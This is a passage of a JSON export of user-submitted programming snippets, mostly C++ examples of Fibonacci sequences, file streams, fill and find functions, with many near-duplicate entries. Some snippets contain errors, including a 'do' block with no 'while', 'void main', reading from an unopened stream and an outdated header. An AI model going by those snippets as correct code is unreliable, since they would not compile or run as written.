p[i].waiting_time;         total_response_time += p[i].response_time;         total_idle_time += (i == 0)?(p[i].arrival_time):(p[i].start_time - p[i-1].completion_time);     }      avg_turnaround_time = (float) total_turnaround_time / n;     avg_waiting_time = (float) total_waiting_time / n;     avg_response_time = (float) total_response_time / n;     cpu_utilisation = ((p[n-1].completion_time - total_idle_time) / (float) p[n-1].completion_time)*100;     throughput = float(n) / (p[n-1].completion_time - p[0].arrival_time);      sort(p,p+n,compareID);      cout<<endl;     cout<<\"#P\\t\"<<\"AT\\t\"<<\"BT\\t\"<<\"ST\\t\"<<\"CT\\t\"<<\"TAT\\t\"<<\"WT\\t\"<<\"RT\\t\"<<\"\\n\"<<endl;      for(int i = 0; i < n; i++) {         cout<<p[i].pid<<\"\\t\"<<p[i].arrival_time<<\"\\t\"<<p[i].burst_time<<\"\\t\"<<p[i].start_time<<\"\\t\"<<p[i].completion_time<<\"\\t\"<<p[i].turnaround_time<<\"\\t\"<<p[i].waiting_time<<\"\\t\"<<p[i].response_time<<\"\\t\"<<\"\\n\"<<endl;     }     cout<<\"Average Turnaround Time = \"<<avg_turnaround_time<<endl;     cout<<\"Average Waiting Time = \"<<avg_waiting_time<<endl;     cout<<\"Average Response Time = \"<<avg_response_time<<endl;     cout<<\"CPU Utilization = \"<<cpu_utilisation<<\"%\"<<endl;     cout<<\"Throughput = \"<<throughput<<\" process/unit time\"<<endl;   } \n",
    "reg_date": "2021-10-12T11:40:06.000Z"
  },
  {
    "id": 2002,
    "keyword": null,
    "link": null,
    "title": " fibbonaci c++",
    "description": "//dp ;Bottom up approach #include <iostream>  using namespace std; int fib(int n) {     int fib[n+1];     fib[0]=0;     fib[1]=1;     for(int i=2;i<=n;i++)     {         fib[i]=fib[i-1]+fib[i-2];     }     return fib[n]; }  int main() {     int n;     cout<<\"enter the value whose fibonaaci value you want to claculate:\"<<endl;     cin>>n;     if(n<=1)     {         cout<<\"fib is: \"<<n<<endl;     }     else     {         cout<<\"fib is: \"<<fib(n)<<endl;     }     return 0; } \n",
    "reg_date": "2021-10-12T11:40:06.000Z"
  },
  {
    "id": 2003,
    "keyword": null,
    "link": null,
    "title": " fibbonaci numbers",
    "description": "0, 1, 1, 2, 3, 5, 8, 13, 21, 34, ...\n//using dp, top -down approach memoization #include <iostream>  using namespace std; int arr[1000]; int fib(int n) {     if(arr[n]==0)     {         if(n<=1)         {             arr[n]=n;         }         else         {             arr[n]=fib(n-1)+fib(n-2);         }     }     return arr[n]; }  int main() {     int n;     cout<<\"enter the value of which fibonacci value you want to calculate:\"<<endl;     cin>>n;     int f=fib(n);     cout<<\"fib value is: \"<<f<<endl;     return 0; } \n",
    "reg_date": "2021-10-12T11:40:06.000Z"
  },
  {
    "id": 2004,
    "keyword": null,
    "link": null,
    "title": " fibonacci",
    "description": "# WARNING: this program assumes the # fibonacci sequence starts at 1 def fib(num): \t\"\"\"return the number at index `num` in the fibonacci sequence\"\"\"     if num <= 2:         return 1     return fib(num - 1) + fib(num - 2)  # method 2: use `for` loop def fib2(num): \ta, b = 1, 1 \tfor _ in range(num - 1): \t\ta, b = b, a + b \treturn a   print(fib(6))  # 8 print(fib2(6))  # same result, but much faster\n# Easy fibonacci exercise # Method #1 def fibonacci(n):     # 1th: 0     # 2th: 1     # 3th: 1 ...     if n == 1:         return 0     elif n == 2:         return 1     else:         return fibonacci(n - 1) + fibonacci(n - 2)  # Method #2 def fibonacci2(n):     if n == 0: return 0     n1 = 1     n2 = 1     # (1, n - 2) because start by 1, 2, 3... not 0, 1, 1, 2, 3....     for i in range(1, n - 2):         n1 += n2         n2 = n1 - n2     return n1   print(fibonacci(13)) # return the nth element in the fibonacci sequence\nf(n) = f(n-1) + f(n-2)                                    f(6)                                    ^   \t\t\t                       /\\                 f(5)               +                       f(4)                 ^                /\\                   +                        /\\                          f(4)    +           f(3)                     f(3)    +    f(2)        ^                       ^                     ^              ^       /\\                       /\\                    /\\            /\\      f(3)   +       f(2)            f(2) +f(1)       f(2) + f(1)   f(1) +  f(0)                 ^              ^                ^                ^    /\\             /\\                /\\              /\\      f(2) + f(1)      f(1) +  f(0)     f(1)+ f(0)       f(1) + f(0)            ^   /\\ f(1) +  f(0)     //f(6) = 8   ==>  f(1)*8    f(1) appears 8 times   double feb  = (1/Math.pow(5,0.5)) * (Math.pow((1+Math.pow(5,0.5))/2,n)) - (1/Math.pow(5,0.5))* (Math.pow((1-Math.pow(5,0.5))/2,n));      f(1) == 1;                        \nimport java.util.Scanner; public class Fibonacci  {     public static void main(String[] args)      {         int n, a = 0, b = 0, c = 1;         Scanner s = new Scanner(System.in);         System.out.print(\"Enter value of n:\");         n = s.nextInt();         System.out.print(\"Fibonacci Series:\");         for(int i = 1; i <= n; i++)         {             a = b;             b = c;             c = a + b;             System.out.print(a+\" \");         }     } }\n// program to generate fibonacci series up to n terms  // take input from the user const number = parseInt(prompt('Enter the number of terms: ')); let n1 = 0, n2 = 1, nextTerm;  console.log('Fibonacci Series:');  for (let i = 1; i <= number; i++) {     console.log(n1);     nextTerm = n1 + n2;     n1 = n2;     n2 = nextTerm; }Copied\nEach test case will contains a single integer n where n >=1. \n                         fib(5)                         /                                  fib(4)                fib(3)                 /                      /               fib(3)      fib(2)         fib(2)    fib(1)         /             /           /         fib(2)   fib(1)  fib(1) fib(0) fib(1) fib(0)   /     fib(1) fib(0) \n",
    "reg_date": "2021-10-12T11:40:06.000Z"
  },
  {
    "id": 2005,
    "keyword": null,
    "link": null,
    "title": " fibonacci in c++",
    "description": "#include <iostream> using namespace std;  int main(){ \tint a{0},b{1},count{},c{}; \tcin >> count; \tfor (int i = 0; i < count; ++i) \t{ \t\tcout << a << endl; \t\tc = b; \t\tb = a + b; \t\ta = c; \t} }\n#include <iostream> using namespace std; int main() { \tint num = 1, pre_num = 0, sum, n; \tdo \t{ \t\tcout << \"Enter number of terms 'n'of Fibonacci series: \"; \t\tcin >> n; \t\tcout << \"Fibonacci series: \"; \t\tfor (int i = 0; i < n; i++) \t\t{ \t\t\tsum = num + pre_num; \t\t\tpre_num = num; \t\t\tnum = sum; \t\t\tcout << num << \" \"; \t\t} \treturn 0; }\n#include <iostream> using namespace std;  int main () {     int num1, num2, num3, input;      num1 = 0;     num2 = 1;     cout << \"How many nums in sequence do you want to see: \";      cin >> input;      cout << num1 << \" \" << num2 << \" \";       for(int i = 2; i < input; i++) // runs through every element but first two      {         num3 = num1 + num2;          cout << num3 << \" \";          num1 = num2;          num2 = num3;      }          return 0; }\n#include<iostream> using namespace std; int main() {     int num,num1=0,num2=1,num3,i=0;     cout<<\"enter the number num\"<<endl;     cin>>num;     for(i=1;i<=num;i++)     {         num3=num1+num2;         num1=num2;         num2=num3;         cout<<num3<<endl;     }  } \n//dp ;Bottom up approach #include <iostream>  using namespace std; int fib(int n) {     int fib[n+1];     fib[0]=0;     fib[1]=1;     for(int i=2;i<=n;i++)     {         fib[i]=fib[i-1]+fib[i-2];     }     return fib[n]; }  int main() {     int n;     cout<<\"enter the value whose fibonaaci value you want to claculate:\"<<endl;     cin>>n;     if(n<=1)     {         cout<<\"fib is: \"<<n<<endl;     }     else     {         cout<<\"fib is: \"<<fib(n)<<endl;     }     return 0; } \n#include <iostream> using namespace std;  int main() {     int n, t1 = 0, t2 = 1, nextTerm = 0;      cout << \"Enter the number of terms: \";     cin >> n;      cout << \"Fibonacci Series: \";      for (int i = 1; i <= n; ++i)     {         // Prints the first two terms.         if(i == 1)         {             cout << \" \" << t1;             continue;         }         if(i == 2)         {             cout << t2 << \" \";             continue;         }         nextTerm = t1 + t2;         t1 = t2;         t2 = nextTerm;                  cout << nextTerm << \" \";     }     return 0; } \n",
    "reg_date": "2021-10-12T11:40:06.000Z"
  },
  {
    "id": 2006,
    "keyword": null,
    "link": null,
    "title": " fibonacci numbers in c++",
    "description": "#include <iostream> using namespace std;  int main(){ \tint a{0},b{1},count{},c{}; \tcin >> count; \tfor (int i = 0; i < count; ++i) \t{ \t\tcout << a << endl; \t\tc = b; \t\tb = a + b; \t\ta = c; \t} }\n#include <iostream> using namespace std;  int main () {     int num1, num2, num3, input;      num1 = 0;     num2 = 1;     cout << \"How many nums in sequence do you want to see: \";      cin >> input;      cout << num1 << \" \" << num2 << \" \";       for(int i = 2; i < input; i++) // runs through every element but first two      {         num3 = num1 + num2;          cout << num3 << \" \";          num1 = num2;          num2 = num3;      }          return 0; }\n#include<iostream> using namespace std; int main() {     int num,num1=0,num2=1,num3,i=0;     cout<<\"enter the number num\"<<endl;     cin>>num;     for(i=1;i<=num;i++)     {         num3=num1+num2;         num1=num2;         num2=num3;         cout<<num3<<endl;     }  } \n#include <iostream> using namespace std; void main() {     int num,x=0,y=1,fib=0;     cin >> num;     if (num == 1)         cout << \"0\";     else if (num == 2)         cout << \"0 1\";     else     {         cout << \"0 1 \";         for (size_t i = 0; i < num - 2; i++)         {             fib = x + y;             x = y;             y = fib;             cout << fib << \" \";          }     } }\n#include <iostream> using namespace std;  int main() {     int n, t1 = 0, t2 = 1, nextTerm = 0;      cout << \"Enter the number of terms: \";     cin >> n;      cout << \"Fibonacci Series: \";      for (int i = 1; i <= n; ++i)     {         // Prints the first two terms.         if(i == 1)         {             cout << \" \" << t1;             continue;         }         if(i == 2)         {             cout << t2 << \" \";             continue;         }         nextTerm = t1 + t2;         t1 = t2;         t2 = nextTerm;                  cout << nextTerm << \" \";     }     return 0; } \n",
    "reg_date": "2021-10-12T11:40:06.000Z"
  },
  {
    "id": 2007,
    "keyword": null,
    "link": null,
    "title": " fibonacci sequence c++",
    "description": "#include <iostream> using namespace std;  int main(){ \tint a{0},b{1},count{},c{}; \tcin >> count; \tfor (int i = 0; i < count; ++i) \t{ \t\tcout << a << endl; \t\tc = b; \t\tb = a + b; \t\ta = c; \t} }\n#include <iostream> using namespace std;  int main () {     int num1, num2, num3, input;      num1 = 0;     num2 = 1;     cout << \"How many nums in sequence do you want to see: \";      cin >> input;      cout << num1 << \" \" << num2 << \" \";       for(int i = 2; i < input; i++) // runs through every element but first two      {         num3 = num1 + num2;          cout << num3 << \" \";          num1 = num2;          num2 = num3;      }          return 0; }\n#include<iostream> using namespace std; int main() {     int num,num1=0,num2=1,num3,i=0;     cout<<\"enter the number num\"<<endl;     cin>>num;     for(i=1;i<=num;i++)     {         num3=num1+num2;         num1=num2;         num2=num3;         cout<<num3<<endl;     }  } \n#include <iostream> using namespace std; void main() {     int num,x=0,y=1,fib=0;     cin >> num;     if (num == 1)         cout << \"0\";     else if (num == 2)         cout << \"0 1\";     else     {         cout << \"0 1 \";         for (size_t i = 0; i < num - 2; i++)         {             fib = x + y;             x = y;             y = fib;             cout << fib << \" \";          }     } }\n#include <iostream> using namespace std;  int main() {     int n, t1 = 0, t2 = 1, nextTerm = 0;      cout << \"Enter the number of terms: \";     cin >> n;      cout << \"Fibonacci Series: \";      for (int i = 1; i <= n; ++i)     {         // Prints the first two terms.         if(i == 1)         {             cout << \" \" << t1;             continue;         }         if(i == 2)         {             cout << t2 << \" \";             continue;         }         nextTerm = t1 + t2;         t1 = t2;         t2 = nextTerm;                  cout << nextTerm << \" \";     }     return 0; } \n",
    "reg_date": "2021-10-12T11:40:06.000Z"
  },
  {
    "id": 2008,
    "keyword": null,
    "link": null,
    "title": " fibonacci series in c++",
    "description": "#include <iostream> using namespace std;  int main(){ \tint a{0},b{1},count{},c{}; \tcin >> count; \tfor (int i = 0; i < count; ++i) \t{ \t\tcout << a << endl; \t\tc = b; \t\tb = a + b; \t\ta = c; \t} }\n#include <iostream> using namespace std; int main() { \tint num = 1, pre_num = 0, sum, n; \tdo \t{ \t\tcout << \"Enter number of terms 'n'of Fibonacci series: \"; \t\tcin >> n; \t\tcout << \"Fibonacci series: \"; \t\tfor (int i = 0; i < n; i++) \t\t{ \t\t\tsum = num + pre_num; \t\t\tpre_num = num; \t\t\tnum = sum; \t\t\tcout << num << \" \"; \t\t} \treturn 0; }\n#include <iostream> using namespace std;  int main () {     int num1, num2, num3, input;      num1 = 0;     num2 = 1;     cout << \"How many nums in sequence do you want to see: \";      cin >> input;      cout << num1 << \" \" << num2 << \" \";       for(int i = 2; i < input; i++) // runs through every element but first two      {         num3 = num1 + num2;          cout << num3 << \" \";          num1 = num2;          num2 = num3;      }          return 0; }\n#include<iostream> using namespace std; int main() {     int num,num1=0,num2=1,num3,i=0;     cout<<\"enter the number num\"<<endl;     cin>>num;     for(i=1;i<=num;i++)     {         num3=num1+num2;         num1=num2;         num2=num3;         cout<<num3<<endl;     }  } \n#include <iostream> using namespace std;  int main() {     int n, t1 = 0, t2 = 1, nextTerm = 0;      cout << \"Enter the number of terms: \";     cin >> n;      cout << \"Fibonacci Series: \";      for (int i = 1; i <= n; ++i)     {         // Prints the first two terms.         if(i == 1)         {             cout << \" \" << t1;             continue;         }         if(i == 2)         {             cout << t2 << \" \";             continue;         }         nextTerm = t1 + t2;         t1 = t2;         t2 = nextTerm;                  cout << nextTerm << \" \";     }     return 0; } \n",
    "reg_date": "2021-10-12T11:40:07.000Z"
  },
  {
    "id": 2009,
    "keyword": null,
    "link": null,
    "title": " fibonacci series in c++ Recursive",
    "description": "#include<iostream> using namespace std; int fib(int n) {    if (n <= 1)    return n;    return fib(n-1) + fib(n-2); } int main () {    int n = 10, i;    for(i=0;i<n;i++)    cout<<fib(i)<<\" \";    return 0; }\n",
    "reg_date": "2021-10-12T11:40:07.000Z"
  },
  {
    "id": 2010,
    "keyword": null,
    "link": null,
    "title": " fibonacci series in c++ using dynamic programming",
    "description": "#include<bits/stdc++.h> using namespace std;   class GFG{       public: int fib(int n) {           // Declare an array to store     // Fibonacci numbers.     // 1 extra to handle     // case, n = 0     int f[n + 2];     int i;       // 0th and 1st number of the     // series are 0 and 1     f[0] = 0;     f[1] = 1;       for(i = 2; i <= n; i++)     {                  //Add the previous 2 numbers        // in the series and store it        f[i] = f[i - 1] + f[i - 2];     }     return f[n];     } };   // Driver code int main () {     GFG g;     int n = 9;           cout << g.fib(n);     return 0; }   // This code is contributed by SoumikMondal\n# Fibonacci Series using Dynamic Programming def fibonacci(n):           # Taking 1st two fibonacci numbers as 0 and 1     f = [0, 1]                 for i in range(2, n+1):         f.append(f[i-1] + f[i-2])     return f[n]       print(fibonacci(9)) \n",
    "reg_date": "2021-10-12T11:40:07.000Z"
  },
  {
    "id": 2011,
    "keyword": null,
    "link": null,
    "title": " file c++",
    "description": "// reading a text file #include <iostream> #include <fstream> #include <string> using namespace std;  int main () {   string line;   ifstream myfile (\"example.txt\");   if (myfile.is_open())   {     while ( getline (myfile,line) )     {       //use line here     }     myfile.close();   }    else cout << \"Unable to open file\";     return 0; }\n// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n#include <iostream> #include <fstream> using namespace std;  ifstream file_variable; //ifstream is for input from plain text files file_variable.open(\"input.txt\"); //open input.txt  file_variable.close(); //close the file stream /* Manually closing a stream is only necessary if you want to re-use the same stream variable for a different file, or want to switch from input to output on the same file. */ _____________________________________________________ //You can also use cin if you have tables like so: while (cin >> name >> value)// you can also use the file stream instead of this {  cout << name << value << endl; } _____________________________________________________ //ifstream file_variable; //ifstream is for input from plain text files ofstream out_file; out_file.open(\"output.txt\");  out_file << \"Write this scentence in the file\" << endl;\n// io/read-file-sum.cpp - Read integers from file and print sum. // Fred Swartz 2003-08-20  #include <iostream> #include <iomanip> #include <fstream> using namespace std;  int main() {     int sum = 0;     int x;     ifstream inFile;          inFile.open(\"test.txt\");     if (!inFile) {         cout << \"Unable to open file\";         exit(1); // terminate with error     }          while (inFile >> x) {         sum = sum + x;     }          inFile.close();     cout << \"Sum = \" << sum << endl;      return 0; } \n#include <iostream> #include <string> #include <fstream> //write and read //#include <ifstream> //read //#include <ofstream> //write  int main () {   std::string line;   std::ofstream myfileWrite;   std::ifstream myfileRead;   myfileWrite.open(\"example.txt\");   myfileRead.open(\"example.txt\");   myfileWrite << \"Writing this to a file.\\n\";   while (getline(myfileRead,line)){     std::cout << line << '\\n';   }   myfileWrite.close();   myfileRead.close();   return 0; }\n#include <fstream.h>  void main()  {   ifstream OpenFile(\"cpp-input.txt\");   char ch;   while(!OpenFile.eof())   {     OpenFile.get(ch);     cout << ch;   }   OpenFile.close(); }\n",
    "reg_date": "2021-10-12T11:40:07.000Z"
  },
  {
    "id": 2012,
    "keyword": null,
    "link": null,
    "title": " file handling in c++",
    "description": "// reading a text file #include <iostream> #include <fstream> #include <string> using namespace std;  int main () {   string line;   ifstream myfile (\"example.txt\");   if (myfile.is_open())   {     while ( getline (myfile,line) )     {       //use line here     }     myfile.close();   }    else cout << \"Unable to open file\";     return 0; }\n// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n#include <iostream> #include <fstream> #include <cstring> #include <process.h> using namespace std; int main() {     char name[999]; //Used to store data     ofstream writeMode; //Created object of ofstream     writeMode.open(\"name.dat\"); //Opened the file in write mode     cout<<\"******** Writing into file ********\"<<endl;     cout<<\"Enter your name: \";     cin.getline(name, 999); //Accepts string with spaces and after spaces eg ____ ____     writeMode<<name<<endl; //Putted data inside the file     cout<<\"Enter your age: \";     cin>>name;     cin.ignore(); //Wrote because number is accepted :P, may be     writeMode<<name<<endl; //Again putted data inside the file     writeMode.close(); //Closed the write mode     ifstream readMode; //Created object of ifstream     readMode.open(\"name.dat\"); //Opened the file in read mode.     cout<<\"******** Reading into file ********\"<<endl;     readMode>>name;     cout<<name<<endl; //Write the data to the screen     readMode>>name; //again read the data from the file and display it     cout<<name<<endl;     readMode.close(); //Closed the read mode     system(\"pause\");     return 0; }\n",
    "reg_date": "2021-10-12T11:40:07.000Z"
  },
  {
    "id": 2013,
    "keyword": null,
    "link": null,
    "title": " file objects in c++",
    "description": "// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n",
    "reg_date": "2021-10-12T11:40:07.000Z"
  },
  {
    "id": 2014,
    "keyword": null,
    "link": null,
    "title": " file open cpp",
    "description": "/ fstream::open / fstream::close #include <fstream>      // std::fstream  int main () {    std::fstream fs;   fs.open (\"test.txt\", std::fstream::in | std::fstream::out | std::fstream::app);    fs << \" more lorem ipsum\";    fs.close();    return 0; }\n#include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"file.txt\");   myfile << \"Writing to a file.\\n\";   myfile.close();   return 0; }\n",
    "reg_date": "2021-10-12T11:40:07.000Z"
  },
  {
    "id": 2015,
    "keyword": null,
    "link": null,
    "title": " file reading c++",
    "description": "// reading a text file #include <iostream> #include <fstream> #include <string> using namespace std;  int main () {   string line;   ifstream myfile (\"example.txt\");   if (myfile.is_open())   {     while ( getline (myfile,line) )     {       //use line here     }     myfile.close();   }    else cout << \"Unable to open file\";     return 0; }\n// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n// io/read-file-sum.cpp - Read integers from file and print sum. // Fred Swartz 2003-08-20  #include <iostream> #include <iomanip> #include <fstream> using namespace std;  int main() {     int sum = 0;     int x;     ifstream inFile;          inFile.open(\"test.txt\");     if (!inFile) {         cout << \"Unable to open file\";         exit(1); // terminate with error     }          while (inFile >> x) {         sum = sum + x;     }          inFile.close();     cout << \"Sum = \" << sum << endl;      return 0; } \n#include <fstream>  ifstream file_variable; //ifstream is for input from plain text files file_variable.open(\"input.txt\"); //open input.txt  file_variable.close(); //close the file stream /* Manually closing a stream is only necessary if you want to re-use the same stream variable for a different file, or want to switch from input to output on the same file. */ _____________________________________________________ //You can also use cin if you have tables like so: while (cin >> name >> value)// you can also use the file stream instead of this {  cout << name << value << endl; } _____________________________________________________ //ifstream file_variable; //ifstream is for input from plain text files ofstream out_file; out_file.open(\"output.txt\");  out_file << \"Write this scentence in the file\" << endl;\nint a, b;      ifstream bd;  myfile.open(\"file.txt\");  if (myfile.is_open()) \twhile (bd >> a >> b)     \tcout << a << b << endl;  else cout << \"ERROR\";\n#include <iostream> #include <fstream> using namespace std; int main() { \tfstream my_file; \tmy_file.open(\"my_file.txt\", ios::in); \tif (!my_file) { \t\tcout << \"No such file\"; \t} \telse { \t\tchar ch;  \t\twhile (1) { \t\t\tmy_file >> ch; \t\t\tif (my_file.eof()) \t\t\t\tbreak;  \t\t\tcout << ch; \t\t}  \t} \tmy_file.close(); \treturn 0; } \n",
    "reg_date": "2021-10-12T11:40:07.000Z"
  },
  {
    "id": 2016,
    "keyword": null,
    "link": null,
    "title": " file streams in c++",
    "description": "$./a.out Writing to the file Enter your name: Zara Enter your age: 9 Reading from the file Zara 9 \n",
    "reg_date": "2021-10-12T11:40:07.000Z"
  },
  {
    "id": 2017,
    "keyword": null,
    "link": null,
    "title": " files c++",
    "description": "// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\nfstream  afile; afile.open(\"file.dat\", ios::out | ios::in ); \n",
    "reg_date": "2021-10-12T11:40:08.000Z"
  },
  {
    "id": 2018,
    "keyword": null,
    "link": null,
    "title": " fill array c++",
    "description": "#include <iostream> #include <array> using namespace std; main () {   array<int,6> myarray;   myarray.fill(5);   cout << \"myarray contains:\";   for (int& x : myarray) {        cout << ' ' << x;    }   cout << '\\n';   //myarray contains: 5 5 5 5 5 5   return 0; }\nfill(arr,arr+n,0)\n",
    "reg_date": "2021-10-12T11:40:08.000Z"
  },
  {
    "id": 2019,
    "keyword": null,
    "link": null,
    "title": " fill c++",
    "description": "fill (ForwardIterator first, ForwardIterator last, const T& val); //EXample:  fill(v.begin(), v.end(), -1);\n",
    "reg_date": "2021-10-12T11:40:08.000Z"
  },
  {
    "id": 2020,
    "keyword": null,
    "link": null,
    "title": " filling 2d array with 0 c++",
    "description": "int a[x][y]; std::fill(a[0], a[0] + x * y, 0);\n",
    "reg_date": "2021-10-12T11:40:08.000Z"
  },
  {
    "id": 2021,
    "keyword": null,
    "link": null,
    "title": " final in c++",
    "description": "const int x = 8; x = 10; // Error. x is final variable now\nstruct Base {     virtual void foo(); };   struct A : Base {     void foo() final; // Base::foo is overridden and A::foo is the final override     void bar() final; // Error: bar cannot be final as it is non-virtual };   struct B final : A // struct B is final {     void foo() override; // Error: foo cannot be overridden as it is final in A };   struct C : B // Error: B is final { };\n",
    "reg_date": "2021-10-12T11:40:08.000Z"
  },
  {
    "id": 2022,
    "keyword": null,
    "link": null,
    "title": " find a member variable in a vector of objects cpp",
    "description": "//Using a standard functor  struct MatchString {  MatchString(const std::string& s) : s_(s) {}  bool operator()(const Type& obj) const  {    return obj.getName() == s_;  }  private:    const std::string& s_; }; \n//Using a lambda function (only C++11 or newer) std::vector<Type> v = ....; std::string myString = ....; auto it = find_if(v.begin(), v.end(), [&myString](const Type& obj) {return obj.getName() == myString;})  if (it != v.end()) {   // found element. it is an iterator to the first matching element.   // if you really need the index, you can also get it:   auto index = std::distance(v.begin(), it); } \n",
    "reg_date": "2021-10-12T11:40:08.000Z"
  },
  {
    "id": 2023,
    "keyword": null,
    "link": null,
    "title": " find a number in vector c++",
    "description": "find (vec.begin(), vec.end(), ser);\n",
    "reg_date": "2021-10-12T11:40:08.000Z"
  },
  {
    "id": 2024,
    "keyword": null,
    "link": null,
    "title": " find all  balanced braces",
    "description": "void  find_balanced_braces(size_t const &n, size_t open, size_t close, size_t index, string &s, vector<string> &res){     if(open == n and close == n)         res.push_back(s);     else{         if(open < n){             s[index] = '(';             find_balanced_braces(n, open+1, close, index+1, s, res);         }         if(close < open){             s[index] = ')';             find_balanced_braces(n, open, close+1, index+1, s, res);         }     } }  find_balanced_braces(n, 0, 0, 0, s, res);\n",
    "reg_date": "2021-10-12T11:40:09.000Z"
  },
  {
    "id": 2025,
    "keyword": null,
    "link": null,
    "title": " find all occurrences of a substring in a string c++",
    "description": "#include <string> #include <iostream>  using namespace std;  int main() {     string s(\"hello hello\");     int count = 0;     size_t nPos = s.find(\"hello\", 0); // first occurrence     while(nPos != string::npos)     {         count++;         nPos = s.find(\"hello\", nPos + 1);     }      cout << count; };\nstring str,sub; // str is string to search, sub is the substring to search for  vector<size_t> positions; // holds all the positions that sub occurs within str  size_t pos = str.find(sub, 0); while(pos != string::npos) {     positions.push_back(pos);     pos = str.find(sub,pos+1); } \nstd::string parentstring = \"Hello Agnosticdev, I love Tutorials\"; std::string substring = \"Agnosticdev\"; auto index = parentstring.find(substring);\n",
    "reg_date": "2021-10-12T11:40:09.000Z"
  },
  {
    "id": 2026,
    "keyword": null,
    "link": null,
    "title": " find all the palindrome substring in a given string",
    "description": "#include <iostream> #include <string> #include <unordered_set> using namespace std;  // expand in both directions of low and high to find all palindromes void expand(string str, int low, int high, auto &set) { \t// run till str[low.high] is a palindrome \twhile (low >= 0 && high < str.length() \t\t\t&& str[low] == str[high]) \t{ \t\t// push all palindromes into the set \t\tset.insert(str.substr(low, high - low + 1));  \t\t// expand in both directions \t\tlow--, high++; \t} }  // Function to find all unique palindromic substrings of given string void allPalindromicSubstrings(string str) { \t// create an empty set to store all unique palindromic substrings \tunordered_set<string> set;  \tfor (int i = 0; i < str.length(); i++) \t{ \t\t// find all odd length palindrome with str[i] as mid point \t\texpand(str, i, i, set);  \t\t// find all even length palindrome with str[i] and str[i+1] as \t\t// its mid points \t\texpand(str, i, i + 1, set); \t}  \t// print all unique palindromic substrings \tfor (auto i : set) \t\tcout << i << \" \"; }  int main() { \tstring str = \"google\";  \tallPalindromicSubstrings(str);  \treturn 0; }\n",
    "reg_date": "2021-10-12T11:40:09.000Z"
  },
  {
    "id": 2027,
    "keyword": null,
    "link": null,
    "title": " find an element in vector of pair c++",
    "description": "bool isEqual(const std::pair<std::string, int>& element) {     return element.first ==  User.name; } it = std::find_if( sortList.begin(), sortList.end(), isEqual ); \nauto index = std::distance(dict.begin(), std::find_if(dict.begin(), dict.end(), [&](const auto& pair) { return pair.first == movieName; })); \nauto it = std::find_if( sortList.begin(), sortList.end(),     [&User](const std::pair<std::string, int>& element){ return element.first == User.name;} ); \n",
    "reg_date": "2021-10-12T11:40:09.000Z"
  },
  {
    "id": 2028,
    "keyword": null,
    "link": null,
    "title": " find case perumations",
    "description": "void change_case(char &c){     if(c >= 'A' and c <= 'Z')         c += 32;     else if(c >= 'a' and c <= 'z')         c -= 32; }  void find_case_permutations(string s, vector<string> &res, size_t index){     res.push_back(s);     for(size_t i = index; i < s.size(); ++i){         string s1 = s;         if(s1[i] >= 'A') change_case(s1[i]);         else continue;         find_case_permutations(s1, res, i+1);     } }  find_case_permutations(\"ab7c\", res, 0);\n",
    "reg_date": "2021-10-12T11:40:09.000Z"
  },
  {
    "id": 2029,
    "keyword": null,
    "link": null,
    "title": " find character in string c++",
    "description": "auto char_to_find = 'a' if (str.find(char_to_find) != std::string::npos) {     // character found }\n// string::find #include <iostream>       // std::cout #include <string>         // std::string  int main () {   std::string str (\"There are two needles in this haystack with needles.\");   std::string str2 (\"needle\");    // different member versions of find in the same order as above:   std::size_t found = str.find(str2);   if (found!=std::string::npos)     std::cout << \"first 'needle' found at: \" << found << '\\n';    found=str.find(\"needles are small\",found+1,6);   if (found!=std::string::npos)     std::cout << \"second 'needle' found at: \" << found << '\\n';    found=str.find(\"haystack\");   if (found!=std::string::npos)     std::cout << \"'haystack' also found at: \" << found << '\\n';    found=str.find('.');   if (found!=std::string::npos)     std::cout << \"Period found at: \" << found << '\\n';    // let's replace the first needle:   str.replace(str.find(str2),str2.length(),\"preposition\");   std::cout << str << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:40:09.000Z"
  },
  {
    "id": 2030,
    "keyword": null,
    "link": null,
    "title": " find first of",
    "description": "// find_if example #include <iostream>     // std::cout #include <algorithm>    // std::find_if #include <vector>       // std::vector  bool IsOdd (int i) {   return ((i%2)==1); }  int main () {   std::vector<int> myvector;    myvector.push_back(10);   myvector.push_back(25);   myvector.push_back(40);   myvector.push_back(55);    std::vector<int>::iterator it = std::find_if (myvector.begin(), myvector.end(), IsOdd);   std::cout << \"The first odd value is \" << *it << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:40:09.000Z"
  },
  {
    "id": 2031,
    "keyword": null,
    "link": null,
    "title": " find first of c++",
    "description": "#include <algorithm> #include <iostream> #include <vector>   int main() {     std::vector<int> v{0, 2, 3, 25, 5};     std::vector<int> t{3, 19, 10, 2};       auto result = std::find_first_of(v.begin(), v.end(), t.begin(), t.end());       if (result == v.end()) {         std::cout << \"no elements of v were equal to 3, 19, 10 or 2\\n\";     } else {         std::cout << \"found a match at \"                   << std::distance(v.begin(), result) << \"\\n\";     }  }\n",
    "reg_date": "2021-10-12T11:40:09.000Z"
  },
  {
    "id": 2032,
    "keyword": null,
    "link": null,
    "title": " find function in c++",
    "description": "#include <algorithm> #include <vector>  if ( std::find(vec.begin(), vec.end(), item) != vec.end() )    do_this(); else    do_that();\n// find function for strings // my linkedin : https://www.linkedin.com/in/vaalarivan-prasanna-3a07bb203/ str = \"Ilayathapathy\"; subStr = \"thalapathy\"; cout << str.find(subStr, 1);  // prints 5 (first occurrence of substring \\n // starting at index 1\n",
    "reg_date": "2021-10-12T11:40:09.000Z"
  },
  {
    "id": 2033,
    "keyword": null,
    "link": null,
    "title": " find gcd in c++ without inbuilt function",
